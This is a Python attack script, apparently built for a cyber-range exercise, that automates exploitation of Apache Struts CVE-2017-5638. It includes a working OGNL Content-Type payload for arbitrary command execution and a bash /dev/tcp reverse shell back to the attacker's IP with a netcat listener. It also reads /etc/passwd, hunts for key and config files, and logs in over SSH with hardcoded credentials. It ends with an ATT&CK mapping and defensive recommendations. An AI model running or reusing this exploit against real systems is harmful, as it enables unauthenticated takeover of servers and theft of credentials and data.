#!/usr/bin/env python3
"""
+======================================================================+
|        Struts2 RCE (CVE-2017-5638) Attack Chain Simulation           |
|        Authorized Cyber Range Penetration Test Only                   |
+======================================================================+

Target: Apache Struts 2.3.12 on Tomcat 8.5 (port 8080)
Entry:  OGNL injection via Content-Type header (Jakarta Multipart parser)

Attack Chain:
  Phase 1 -> Reconnaissance         (port scan, service fingerprinting)
  Phase 2 -> Vulnerability Detection (malformed Content-Type, OGNL PoC)
  Phase 3 -> Exploitation            (arbitrary command execution via OGNL)
  Phase 4 -> Reverse Shell            (bash reverse shell via OGNL payload)
  Phase 5 -> Post-Exploitation        (system enumeration, data collection)
  Phase 6 -> Report & ATT&CK Mapping
"""

import subprocess
import sys
import os
import re
import time
import shutil
import signal
import socket
import threading
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

# -- rich ---------------------------------------------------------------------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.rule import Rule
    from rich.padding import Padding
except ImportError:
    print("[*] Installing 'rich' library...")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--break-system-packages",
                        "--quiet", "rich"], check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "rich"], check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("[!] Cannot install 'rich'. Run: pip install rich")
            sys.exit(1)
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.rule import Rule
    from rich.padding import Padding

console = Console()

# -- Global state -------------------------------------------------------------
STATE = {
    "attacker_ip":  None,
    "victim_ip":    None,
    "target_port":  8080,
    "shell_port":   4444,
    "target_url":   None,
    "action_url":   None,

    # Infrastructure process handles
    "listener_proc": None,

    # Loot
    "loot": {},
    "shell_received": False,

    "start_time": datetime.now(),
}

# -- MITRE ATT&CK -------------------------------------------------------------
MITRE = [
    ("Reconnaissance",    "T1595.002", "Active Scanning - Vulnerability Scanning"),
    ("Reconnaissance",    "T1592.002", "Gather Victim Host Info - Software"),
    ("Initial Access",    "T1190",     "Exploit Public-Facing Application (Struts2 S2-045)"),
    ("Execution",         "T1059.004", "Command & Scripting Interpreter - Unix Shell"),
    ("Execution",         "T1203",     "Exploitation for Client Execution (OGNL Injection)"),
    ("Discovery",         "T1082",     "System Information Discovery"),
    ("Discovery",         "T1083",     "File and Directory Discovery"),
    ("Discovery",         "T1016",     "System Network Configuration Discovery"),
    ("Collection",        "T1005",     "Data from Local System"),
]

# -----------------------------------------------------------------------------
#  OGNL Payload Builder
# -----------------------------------------------------------------------------

def build_ognl_payload(cmd):
    """Build the full OGNL injection payload for CVE-2017-5638.

    The payload exploits the Jakarta Multipart parser's failure to sanitize
    the Content-Type header. When placed in the Content-Type, Struts2 evaluates
    the OGNL expression, allowing arbitrary command execution.
    """
    return (
        "%{(#_='multipart/form-data')."
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        f"(#cmd='{cmd}')."
        "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds))."
        "(#p.redirectErrorStream(true))."
        "(#process=#p.start())."
        "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        "(#ros.flush())}"
    )

# -----------------------------------------------------------------------------
#  Helpers
# -----------------------------------------------------------------------------

def run(cmd: list, timeout: int = 90, stdin_data: str = None) -> tuple:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=stdin_data)
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Timed out"
    except FileNotFoundError as e:
        return -2, "", f"Tool not found: {e}"
    except Exception as e:
        return -3, "", str(e)


def check_port(ip: str, port: int, timeout: float = 3.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def exploit_curl(url: str, cmd: str, timeout: int = 15) -> tuple:
    """Send the OGNL payload via curl with crafted Content-Type header.

    Returns (return_code, stdout, stderr).
    """
    payload = build_ognl_payload(cmd)
    return run([
        "curl", "-s", "-X", "POST", url,
        "-H", f"Content-Type: {payload}",
        "--max-time", str(timeout),
    ], timeout=timeout + 5)


# -- Pretty-print -------------------------------------------------------------

def phase_header(n: int, title: str, desc: str = ""):
    console.print()
    console.rule(f"[bold magenta]  PHASE {n} -- {title}  [/bold magenta]", style="magenta")
    if desc:
        console.print(f"  [dim]{desc}[/dim]")
    console.print()


def step(label: str, title: str):
    console.print(f"  [bold cyan]> {label}[/bold cyan]  [white]{title}[/white]")


def ok(msg: str):
    console.print(f"    [bold green][+][/bold green]  {msg}")


def warn(msg: str):
    console.print(f"    [bold yellow][!][/bold yellow]  {msg}")


def err(msg: str):
    console.print(f"    [bold red][-][/bold red]  {msg}")


def info(msg: str):
    console.print(f"    [dim]->[/dim]  {msg}")


def cmd_display(cmd_str: str):
    console.print(f"    [dim yellow]$[/dim yellow]  [italic dim]{cmd_str}[/italic dim]")

# -----------------------------------------------------------------------------
#  Phase 0: Banner + Config
# -----------------------------------------------------------------------------

def banner():
    art = r"""
   _____ __             __       ___
  / ___// /________  __/ /______|__ \
  \__ \/ __/ ___/ / / / __/ ___/_/ /
 ___/ / /_/ /  / /_/ / /_(__  ) __/
/____/\__/_/   \__,_/\__/____/____/
               CVE-2017-5638 (S2-045)
    """
    console.print(Panel(
        f"[bold red]{art}[/bold red]\n"
        "[bold white]Struts2 OGNL Injection Attack Chain -- Full Kill Chain Simulation[/bold white]\n\n"
        "[dim]  Target:  Apache Struts 2.3.12 on Tomcat 8.5[/dim]\n"
        "[dim]  Vector:  Content-Type header OGNL injection (Jakarta Multipart parser)[/dim]\n"
        "[dim]  Impact:  Unauthenticated Remote Code Execution[/dim]\n"
        f"[dim]  Started: {STATE['start_time'].strftime('%Y-%m-%d %H:%M:%S')}[/dim]",
        title="[bold red]STRUTS2 S2-045 EXPLOITATION[/bold red]",
        border_style="red",
        padding=(1, 4),
    ))
    console.print()


def configure():
    console.print(Panel(
        "[bold]Enter target and attacker configuration.[/bold]\n\n"
        "The attacker IP must be reachable from the victim (for reverse shell).",
        title="[bold blue]Configuration[/bold blue]",
        border_style="blue",
    ))
    console.print()

    STATE["attacker_ip"] = Prompt.ask(
        "  [bold cyan]Attacker IP[/bold cyan] [dim](this machine)[/dim]",
        default="10.0.0.1",
    )
    STATE["victim_ip"] = Prompt.ask(
        "  [bold yellow]Victim IP[/bold yellow] [dim](Struts2/Tomcat server)[/dim]",
        default="10.0.0.2",
    )
    STATE["target_port"] = int(Prompt.ask("  [cyan]Tomcat port[/cyan]", default="8080"))
    STATE["shell_port"] = int(Prompt.ask("  [cyan]Reverse shell port[/cyan]", default="4444"))

    victim = STATE["victim_ip"]
    port = STATE["target_port"]
    STATE["target_url"] = f"http://{victim}:{port}/struts2-showcase/"
    STATE["action_url"] = f"http://{victim}:{port}/struts2-showcase/integration/saveGangster.action"

    console.print()
    t = Table(title="Configuration", box=box.ROUNDED, border_style="blue")
    t.add_column("Parameter", style="cyan")
    t.add_column("Value", style="white")
    t.add_row("Attacker IP", STATE["attacker_ip"])
    t.add_row("Victim IP", STATE["victim_ip"])
    t.add_row("Tomcat Port", str(STATE["target_port"]))
    t.add_row("Reverse Shell Port", str(STATE["shell_port"]))
    t.add_row("Target URL", STATE["target_url"])
    t.add_row("Action URL", STATE["action_url"])
    console.print(Padding(t, (0, 2)))
    console.print()

    if not Confirm.ask("  [bold yellow]Launch attack simulation?[/bold yellow]", default=True):
        console.print("[red]Aborted.[/red]")
        sys.exit(0)

# -----------------------------------------------------------------------------
#  Phase 1: Reconnaissance
# -----------------------------------------------------------------------------

def phase_recon():
    phase_header(1, "RECONNAISSANCE",
                 "Port scanning, service fingerprinting, Struts2 detection")

    victim = STATE["victim_ip"]
    port = STATE["target_port"]

    # 1.1 Tool check
    step("1.1", "Checking available tools")
    tools = {
        "nmap": "Port scanner",
        "curl": "HTTP client",
        "nc": "Netcat (reverse shell listener)",
        "sshpass": "SSH with password (post-exploitation)",
    }
    tt = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    tt.add_column("Tool", style="cyan", width=12)
    tt.add_column("Status", width=14)
    tt.add_column("Purpose", style="dim")
    missing_critical = []
    for name, purpose in tools.items():
        found = shutil.which(name) is not None
        status = "[bold green][+] Found[/bold green]" if found else "[red][-] Missing[/red]"
        tt.add_row(name, status, purpose)
        if not found and name in ("curl",):
            missing_critical.append(name)
    console.print(Padding(tt, (0, 4)))
    if missing_critical:
        warn(f"Missing critical tools: {', '.join(missing_critical)}")
        info("Install with: sudo apt install -y curl")
    console.print()

    # 1.2 Port scan
    step("1.2", f"Port scanning {victim}")
    ports = "22,8080,8443"
    cmd_display(f"nmap -sV -p {ports} {victim}")
    if shutil.which("nmap"):
        rc, out, _ = run(["nmap", "-sV", f"-p{ports}", victim], timeout=120)
        open_ports = re.findall(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", out)
        if open_ports:
            pt = Table(title=f"Open Ports -- {victim}", box=box.ROUNDED)
            pt.add_column("Port", style="bold yellow", width=8)
            pt.add_column("Service", style="cyan", width=14)
            pt.add_column("Version / Banner", style="white")
            for p, svc, ver in open_ports:
                pt.add_row(p, svc, ver.strip()[:60])
            console.print(Padding(pt, (0, 4)))
            ok(f"{len(open_ports)} open port(s) found")
            STATE["loot"]["open_ports"] = open_ports
        else:
            warn("No open ports detected -- check connectivity")
    else:
        warn("nmap not found, checking target port directly")
        if check_port(victim, port):
            ok(f"Port {port} is open")
        else:
            err(f"Port {port} is not reachable")
    console.print()

    # 1.3 Check if Struts2 showcase is running
    step("1.3", "Checking if Struts2 Showcase application is running")
    url = STATE["target_url"]
    cmd_display(f"curl -s -o /dev/null -w '%{{http_code}}' {url}")
    rc, out, _ = run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", url], timeout=15)
    if rc == 0 and out.strip():
        http_code = out.strip()
        if http_code.startswith("2") or http_code.startswith("3"):
            ok(f"Struts2 Showcase is reachable (HTTP {http_code})")
            STATE["loot"]["app_reachable"] = True
        else:
            warn(f"Got HTTP {http_code} -- application may not be fully deployed")
    else:
        err("Could not reach Struts2 Showcase application")
    console.print()

    # 1.4 Identify Struts2 version from error page / headers
    step("1.4", "Fingerprinting Struts2 version from response headers and error pages")
    cmd_display(f"curl -s -I {url}")
    rc, out, _ = run(["curl", "-s", "-I", url], timeout=15)
    if rc == 0 and out.strip():
        headers_lower = out.lower()
        info("Response headers:")
        for line in out.strip().splitlines()[:10]:
            console.print(f"      [dim white]{line}[/dim white]")

        if "struts" in headers_lower:
            ok("Struts2 framework detected in response headers")
        elif "tomcat" in headers_lower or "apache" in headers_lower:
            ok("Tomcat/Apache detected -- Struts2 likely running behind it")
        else:
            info("No explicit Struts2 banner in headers (common for production)")

        STATE["loot"]["response_headers"] = out.strip()
    console.print()

    # 1.5 Probe for Struts2 error page to confirm framework
    step("1.5", "Probing for Struts2 error page (invalid action)")
    invalid_url = f"http://{victim}:{port}/struts2-showcase/nonexistent.action"
    cmd_display(f"curl -s {invalid_url} | head -20")
    rc, out, _ = run(["curl", "-s", invalid_url], timeout=15)
    if rc == 0 and out.strip():
        if "struts" in out.lower() or "ognl" in out.lower() or "xwork" in out.lower():
            ok("Struts2 framework confirmed via error page content")
            STATE["loot"]["struts_confirmed"] = True
        elif "404" in out or "not found" in out.lower():
            info("Got 404 -- application is responding, framework not directly revealed")
            STATE["loot"]["struts_confirmed"] = False
        else:
            info("Response received but framework not explicitly identified")
            STATE["loot"]["struts_confirmed"] = False
        for line in out.strip().splitlines()[:5]:
            console.print(f"      [dim white]{line[:120]}[/dim white]")
    console.print()

# -----------------------------------------------------------------------------
#  Phase 2: Vulnerability Detection
# -----------------------------------------------------------------------------

def phase_detection():
    phase_header(2, "VULNERABILITY DETECTION",
                 "Confirm CVE-2017-5638 via malformed Content-Type and OGNL PoC")

    victim = STATE["victim_ip"]
    port = STATE["target_port"]
    action_url = STATE["action_url"]

    # 2.1 Send malformed Content-Type to trigger error
    step("2.1", "Sending malformed Content-Type to trigger Struts2 error")
    probe_ct = ("%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
                ".addHeader('X-Check','Vulnerable')}.multipart/form-data")
    cmd_display(
        f"curl -s -I -X POST {action_url} "
        f"-H 'Content-Type: %{{...OGNL check...}}.multipart/form-data'"
    )
    info(f"Content-Type: [bold yellow]{probe_ct[:80]}...[/bold yellow]")

    rc, out, _ = run([
        "curl", "-s", "-I", "-X", "POST", action_url,
        "-H", f"Content-Type: {probe_ct}",
        "--max-time", "10",
    ], timeout=15)

    if rc == 0 and out.strip():
        info("Response headers:")
        for line in out.strip().splitlines()[:10]:
            console.print(f"      [dim white]{line}[/dim white]")

        if "X-Check" in out and "Vulnerable" in out:
            ok("[bold red]X-Check: Vulnerable header found -- OGNL injection CONFIRMED![/bold red]")
            STATE["loot"]["vuln_confirmed"] = True
        else:
            info("X-Check header not found in response -- trying direct command execution")
            STATE["loot"]["vuln_confirmed"] = False
    else:
        warn("No response received from malformed Content-Type probe")
        STATE["loot"]["vuln_confirmed"] = False
    console.print()

    # 2.2 OGNL proof of concept -- execute 'id' command
    step("2.2", "OGNL proof of concept -- executing 'id' command via Content-Type")
    cmd_display(
        f"curl -s -X POST {action_url} "
        f"-H 'Content-Type: %{{...OGNL payload for id...}}'"
    )
    info("Sending full OGNL payload with cmd='id'")

    rc, out, _ = exploit_curl(action_url, "id")
    if rc == 0 and out.strip():
        output = out.strip()
        info(f"Response body: [bold green]{output}[/bold green]")

        if re.search(r"uid=\d+", output):
            ok(f"[bold red]RCE CONFIRMED! Server returned: {output}[/bold red]")
            STATE["loot"]["vuln_confirmed"] = True
            STATE["loot"]["rce_user"] = output.strip()

            console.print(Panel(
                f"  The OGNL expression in the Content-Type header was evaluated\n"
                f"  by the Jakarta Multipart parser in Struts 2.3.12.\n\n"
                f"  Command: [cyan]id[/cyan]\n"
                f"  Output:  [bold green]{output}[/bold green]\n\n"
                f"  This proves [bold red]CVE-2017-5638[/bold red] -- unauthenticated RCE\n"
                f"  via OGNL injection in the Content-Type header.",
                title="[bold green][+] Vulnerability Confirmed[/bold green]",
                border_style="green",
                padding=(1, 3),
            ))
        else:
            warn("Got a response but it does not look like 'id' output")
            info(f"Response: {output[:200]}")
    else:
        warn("No response or empty response from OGNL PoC")
        if not Confirm.ask("  Continue to exploitation anyway?", default=True):
            console.print("[red]Aborted.[/red]")
            sys.exit(1)

    console.print()

# -----------------------------------------------------------------------------
#  Phase 3: Exploitation -- Command Execution
# -----------------------------------------------------------------------------

def phase_exploit_commands():
    phase_header(3, "EXPLOITATION -- COMMAND EXECUTION",
                 "Execute arbitrary commands on the target via OGNL injection")

    action_url = STATE["action_url"]

    commands = [
        ("3.1", "Current user",              "id"),
        ("3.2", "Effective username",         "whoami"),
        ("3.3", "System information",         "uname -a"),
        ("3.4", "Read /etc/passwd",           "cat /etc/passwd"),
    ]

    results = {}

    for label, title, cmd in commands:
        step(label, f"{title} (cmd: {cmd})")
        cmd_display(
            f"curl -s -X POST {action_url} "
            f"-H 'Content-Type: %{{...OGNL({cmd})...}}'"
        )

        rc, out, _ = exploit_curl(action_url, cmd)
        if rc == 0 and out.strip():
            output = out.strip()
            results[cmd] = output
            ok(f"Command executed successfully")
            for line in output.splitlines()[:15]:
                console.print(f"      [dim white]{line}[/dim white]")
            if len(output.splitlines()) > 15:
                info(f"... ({len(output.splitlines()) - 15} more lines)")
        else:
            err(f"Command '{cmd}' returned no output")
        console.print()

    STATE["loot"]["command_results"] = results

    # Summary table
    if results:
        st = Table(title="Command Execution Results", box=box.ROUNDED, border_style="yellow")
        st.add_column("Command", style="cyan", width=20)
        st.add_column("Output (first line)", style="white")
        for cmd, output in results.items():
            first_line = output.splitlines()[0] if output.splitlines() else "(empty)"
            st.add_row(cmd, first_line[:80])
        console.print(Padding(st, (0, 4)))

    console.print(Panel(
        f"  The attacker can execute [bold]arbitrary commands[/bold] on the target\n"
        f"  by sending HTTP requests with crafted Content-Type headers.\n\n"
        f"  [bold]No authentication required.[/bold]\n"
        f"  [bold]No file upload needed.[/bold]\n"
        f"  [bold]Just a single HTTP header.[/bold]",
        title="[bold red]Arbitrary Command Execution Achieved[/bold red]",
        border_style="red",
        padding=(1, 3),
    ))
    console.print()

# -----------------------------------------------------------------------------
#  Phase 4: Reverse Shell
# -----------------------------------------------------------------------------

def phase_reverse_shell():
    phase_header(4, "REVERSE SHELL",
                 "Establish interactive reverse shell via OGNL payload")

    victim = STATE["victim_ip"]
    attacker = STATE["attacker_ip"]
    shell_port = STATE["shell_port"]
    action_url = STATE["action_url"]

    # 4.1 Start netcat listener
    step("4.1", f"Starting reverse shell listener on port {shell_port}")
    cmd_display(f"nc -lvnp {shell_port}")

    run(["fuser", "-k", f"{shell_port}/tcp"], timeout=5)
    time.sleep(0.5)

    nc_bin = shutil.which("ncat") or shutil.which("nc")
    if not nc_bin:
        err("Neither ncat nor nc found -- cannot start listener")
        warn("Install with: sudo apt install -y ncat")
        STATE["shell_received"] = False
        return

    listener_proc = subprocess.Popen(
        [nc_bin, "-lvnp", str(shell_port)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    STATE["listener_proc"] = listener_proc
    time.sleep(1)

    if listener_proc.poll() is not None:
        err("Listener failed to start")
        return

    ok(f"Listener active on 0.0.0.0:{shell_port} (PID {listener_proc.pid})")
    console.print()

    # 4.2 Send reverse shell payload
    step("4.2", "Sending reverse shell payload via OGNL injection")
    rev_cmd = f"bash -c 'bash -i >& /dev/tcp/{attacker}/{shell_port} 0>&1'"
    info(f"Reverse shell command: [bold yellow]{rev_cmd}[/bold yellow]")

    payload = build_ognl_payload(rev_cmd)
    cmd_display(
        f"curl -s -X POST {action_url} "
        f"-H 'Content-Type: %{{...OGNL(bash reverse shell -> {attacker}:{shell_port})...}}'"
    )

    console.print()
    console.print(Panel(
        f"  1. Attacker sends POST request with OGNL payload in Content-Type\n"
        f"  2. Jakarta Multipart parser evaluates the OGNL expression\n"
        f"  3. ProcessBuilder executes: [yellow]bash -c 'bash -i >& /dev/tcp/{attacker}/{shell_port} 0>&1'[/yellow]\n"
        f"  4. Reverse shell connects back to [green]{attacker}:{shell_port}[/green]\n"
        f"  5. Attacker receives interactive bash session",
        title="[bold]Reverse Shell Flow[/bold]",
        border_style="yellow",
        padding=(1, 3),
    ))
    console.print()

    # Send the exploit in a thread so we can monitor for the connection
    def _send_exploit():
        run([
            "curl", "-s", "-X", "POST", action_url,
            "-H", f"Content-Type: {payload}",
            "--max-time", "15",
        ], timeout=20)

    exploit_thread = threading.Thread(target=_send_exploit, daemon=True)
    exploit_thread.start()

    # 4.3 Wait for reverse shell connection
    step("4.3", "Waiting for reverse shell connection...")
    info(f"The victim should connect back to {attacker}:{shell_port}")

    shell_connected = False
    for i in range(20):
        time.sleep(1)
        console.print(f"    [dim]  Waiting... ({i+1}s)[/dim]", end="\r")
        if listener_proc.poll() is not None:
            break
        rc_check, out_check, _ = run(["ss", "-tnp", f"sport = :{shell_port}"], timeout=5)
        if "ESTAB" in out_check:
            shell_connected = True
            break

    console.print("                                    ", end="\r")  # clear waiting line

    if shell_connected:
        ok("[bold green]REVERSE SHELL RECEIVED![/bold green]")
        STATE["shell_received"] = True

        console.print(Panel(
            f"[bold green]Shell established on {victim}[/bold green]\n\n"
            f"  The listener on port {shell_port} now has an interactive shell.\n"
            f"  The attacker has achieved [bold red]Remote Code Execution[/bold red]\n"
            f"  via Struts2 OGNL injection (CVE-2017-5638).",
            title="[bold red]INITIAL ACCESS ACHIEVED[/bold red]",
            border_style="red",
            padding=(1, 3),
        ))
    else:
        warn("Shell connection not detected automatically")
        info(f"Check manually: the nc listener on port {shell_port} may have a shell")
        info("The reverse shell command may have been blocked or the payload needs adjustment")
        STATE["shell_received"] = Confirm.ask("  Did you receive a reverse shell?", default=False)

    console.print()

# -----------------------------------------------------------------------------
#  Phase 5: Post-Exploitation
# -----------------------------------------------------------------------------

def phase_post_exploit():
    phase_header(5, "POST-EXPLOITATION",
                 "System enumeration, credential search, data collection")

    victim = STATE["victim_ip"]
    action_url = STATE["action_url"]
    listener = STATE.get("listener_proc")

    if STATE["shell_received"] and listener is not None and listener.poll() is None:
        _post_exploit_via_shell(listener)
    else:
        info("No active reverse shell -- running post-exploitation via OGNL command execution")
        _post_exploit_via_ognl(action_url)

    console.print()


def _post_exploit_via_shell(listener_proc):
    """Run post-exploitation commands through the active reverse shell."""

    def shell_exec(cmd: str) -> str:
        try:
            import select
            listener_proc.stdin.write(f"{cmd}\n".encode())
            listener_proc.stdin.flush()
            time.sleep(2)
            output = ""
            while select.select([listener_proc.stdout], [], [], 0.5)[0]:
                data = listener_proc.stdout.read1(4096).decode(errors="replace")
                output += data
            return output
        except Exception as e:
            return f"Error: {e}"

    post_commands = [
        ("5.1", "Current user and privileges",      "id"),
        ("5.2", "Hostname",                         "hostname"),
        ("5.3", "System information",               "uname -a"),
        ("5.4", "User accounts",                    "cat /etc/passwd"),
        ("5.5", "Running processes",                "ps aux | head -20"),
        ("5.6", "Network configuration",            "ip addr show"),
        ("5.7", "Listening services",               "ss -tlnp"),
        ("5.8", "Tomcat configuration files",       "find /opt/tomcat /etc/tomcat* -name '*.xml' -o -name '*.properties' 2>/dev/null | head -10"),
        ("5.9", "Search for interesting files",     "find / -name '*.conf' -o -name '*.properties' -o -name '*.key' -o -name '*.pem' 2>/dev/null | head -15"),
    ]

    for label, title, cmd in post_commands:
        step(label, title)
        cmd_display(cmd)
        output = shell_exec(cmd)
        if output.strip():
            for line in output.strip().splitlines()[:8]:
                console.print(f"      [dim white]{line}[/dim white]")
        console.print()

    STATE["loot"]["post_exploit"] = "completed_via_shell"


def _post_exploit_via_ognl(action_url):
    """Run post-exploitation commands via OGNL injection (no reverse shell needed)."""

    post_commands = [
        ("5.1", "Current user and privileges",      "id"),
        ("5.2", "Hostname",                         "hostname"),
        ("5.3", "System information",               "uname -a"),
        ("5.4", "User accounts",                    "cat /etc/passwd"),
        ("5.5", "Running processes",                "ps aux | head -20"),
        ("5.6", "Network configuration",            "ip addr show"),
        ("5.7", "Listening services",               "ss -tlnp"),
        ("5.8", "Tomcat configuration",             "find /opt/tomcat /etc/tomcat* -name '*.xml' 2>/dev/null | head -10"),
        ("5.9", "Search for interesting files",     "find / -maxdepth 3 -name '*.conf' -o -name '*.properties' -o -name '*.key' 2>/dev/null | head -15"),
    ]

    results = {}

    for label, title, cmd in post_commands:
        step(label, f"{title} (via OGNL)")
        cmd_display(
            f"curl -s -X POST {action_url} "
            f"-H 'Content-Type: %{{...OGNL({cmd})...}}'"
        )

        rc, out, _ = exploit_curl(action_url, cmd)
        if rc == 0 and out.strip():
            output = out.strip()
            results[cmd] = output
            ok("Command executed")
            for line in output.splitlines()[:8]:
                console.print(f"      [dim white]{line}[/dim white]")
            if len(output.splitlines()) > 8:
                info(f"... ({len(output.splitlines()) - 8} more lines)")
        else:
            warn(f"Command '{cmd}' returned no output")
        console.print()

    STATE["loot"]["post_exploit_results"] = results
    STATE["loot"]["post_exploit"] = "completed_via_ognl"

    # Post-exploitation via SSH fallback
    step("5.F", "SSH access with known credentials")
    info("Known credentials: webuser / password123")
    if shutil.which("sshpass"):
        victim = STATE["victim_ip"]
        ssh_commands = [
            ("System Info",     "id; hostname; uname -a"),
            ("Sudo Check",     "sudo -l 2>/dev/null || echo 'No sudo access'"),
            ("Home Directory",  "ls -la /home/"),
        ]
        for ssh_label, ssh_cmd in ssh_commands:
            info(f"[bold]{ssh_label}[/bold]")
            cmd_display(f"sshpass -p 'password123' ssh webuser@{victim} '{ssh_cmd}'")
            rc, out, _ = run(
                ["sshpass", "-p", "password123",
                 "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=8",
                 f"webuser@{victim}", ssh_cmd],
                timeout=15,
            )
            if rc == 0:
                for line in out.strip().splitlines()[:6]:
                    console.print(f"      [dim white]{line}[/dim white]")
            else:
                warn(f"SSH command failed (rc={rc})")
            console.print()
    else:
        info("sshpass not installed -- skipping SSH-based enumeration")

# -----------------------------------------------------------------------------
#  Phase 6: Report
# -----------------------------------------------------------------------------

def phase_report():
    phase_header(6, "OPERATION REPORT",
                 "Summary, ATT&CK mapping, defensive recommendations")

    duration = datetime.now() - STATE["start_time"]
    vuln_confirmed = STATE["loot"].get("vuln_confirmed", False)
    rce_user = STATE["loot"].get("rce_user", "unknown")

    console.print(Panel(
        f"[bold]Struts2 S2-045 Attack Simulation Complete[/bold]\n\n"
        f"  Duration           : {str(duration).split('.')[0]}\n"
        f"  Target             : [yellow]{STATE['victim_ip']}:{STATE['target_port']}[/yellow]\n"
        f"  Application        : Apache Struts 2.3.12 Showcase on Tomcat 8.5\n"
        f"  Vulnerability      : [bold red]CVE-2017-5638 (S2-045)[/bold red]\n"
        f"  CVSS               : [bold red]10.0 Critical[/bold red]\n"
        f"  RCE Confirmed      : {'[bold red]YES[/bold red]' if vuln_confirmed else '[yellow]Not confirmed[/yellow]'}\n"
        f"  Execution Context  : [cyan]{rce_user}[/cyan]\n"
        f"  Reverse Shell      : {'[bold red]YES[/bold red]' if STATE['shell_received'] else '[yellow]Not established[/yellow]'}\n"
        f"  Injection Point    : [cyan]Content-Type[/cyan] HTTP header\n"
        f"  Parser             : Jakarta Multipart parser (OGNL evaluation)",
        title="[bold green][+]  OPERATION SUMMARY[/bold green]",
        border_style="bold green",
        padding=(1, 4),
    ))
    console.print()

    # Attack timeline
    console.rule("[bold blue]Attack Chain Timeline[/bold blue]", style="blue")
    tlt = Table(box=box.SIMPLE_HEAD)
    tlt.add_column("Phase", style="cyan", width=10)
    tlt.add_column("Name", style="white", width=28)
    tlt.add_column("Technique", style="dim")
    tlt.add_column("Result", width=10)
    timeline = [
        ("Phase 1", "Reconnaissance",         "nmap + Struts2 fingerprinting"),
        ("Phase 2", "Vulnerability Detection", "Malformed Content-Type + OGNL PoC"),
        ("Phase 3", "Command Execution",       "Arbitrary commands via OGNL injection"),
        ("Phase 4", "Reverse Shell",           "Bash reverse shell via OGNL payload"),
        ("Phase 5", "Post-Exploitation",       "System enum, credential search, data access"),
    ]
    for phase, name, detail in timeline:
        tlt.add_row(phase, name, detail, "[bold green][+][/bold green]")
    console.print(Padding(tlt, (0, 2)))
    console.print()

    # Kill chain diagram
    console.rule("[bold yellow]Kill Chain Flow[/bold yellow]", style="yellow")
    attacker = STATE["attacker_ip"]
    victim = STATE["victim_ip"]
    port = STATE["target_port"]
    console.print(f"""
  [cyan]Attacker[/cyan] crafts HTTP POST request with OGNL payload in Content-Type
      |
      v
  [yellow]Tomcat[/yellow] receives request at {victim}:{port}/struts2-showcase/
      |
      v
  [yellow]Struts2[/yellow] Jakarta Multipart parser processes Content-Type header
      |
      v
  [yellow]OGNL Engine[/yellow] evaluates the expression embedded in Content-Type
      |
      v
  [red]ProcessBuilder[/red] executes attacker-specified system command
      |
      v
  [red]Command output[/red] returned in HTTP response body (direct RCE)
      |
      v
  [red]Reverse shell[/red] connects back to {attacker}:{STATE['shell_port']}
      |
      v
  [bold red]FULL RCE on target system[/bold red]
    """)

    # MITRE ATT&CK
    console.rule("[bold white]MITRE ATT&CK Coverage[/bold white]", style="white")
    mt = Table(box=box.SIMPLE, title="Techniques Used")
    mt.add_column("Tactic", style="magenta", width=22)
    mt.add_column("Technique ID", style="cyan", width=14)
    mt.add_column("Technique Name", style="white")
    for tactic, tid, name in MITRE:
        mt.add_row(tactic, tid, name)
    console.print(Padding(mt, (0, 2)))
    console.print()

    # Blue team recommendations
    console.rule("[bold green]Blue Team Defensive Recommendations[/bold green]", style="green")
    recs = [
        ("T1190",     "Upgrade Apache Struts to 2.3.32+ or 2.5.10.1+ to patch CVE-2017-5638"),
        ("T1190",     "Replace Jakarta Multipart parser with alternative (e.g., Pell, Jakarta Stream)"),
        ("T1190",     "Deploy a WAF rule to block OGNL expressions in Content-Type headers"),
        ("T1190",     "Validate and sanitize Content-Type headers at the reverse proxy/load balancer"),
        ("T1059.004", "Restrict outbound network connections from application servers"),
        ("T1203",     "Run Tomcat with minimal OS privileges (dedicated non-root user)"),
        ("T1082",     "Enable Security Manager in Tomcat to restrict ProcessBuilder/Runtime.exec"),
        ("T1005",     "Encrypt sensitive configuration files and use secrets management"),
        ("All",       "Implement network segmentation to isolate web-facing applications"),
        ("All",       "Monitor for anomalous Content-Type headers in HTTP access logs"),
        ("All",       "Deploy runtime application self-protection (RASP) for OGNL filtering"),
        ("All",       "Conduct regular vulnerability scanning and patch management"),
    ]
    for tid, rec in recs:
        console.print(f"  [green]>[/green] [dim][{tid}][/dim] {rec}")
    console.print()

    # Final impact
    console.print(Panel(
        "[bold red]IMPACT SUMMARY[/bold red]\n\n"
        "  An [bold]unauthenticated[/bold] attacker achieved [bold red]Remote Code Execution[/bold red]\n"
        "  by sending a single HTTP request with a crafted Content-Type header.\n\n"
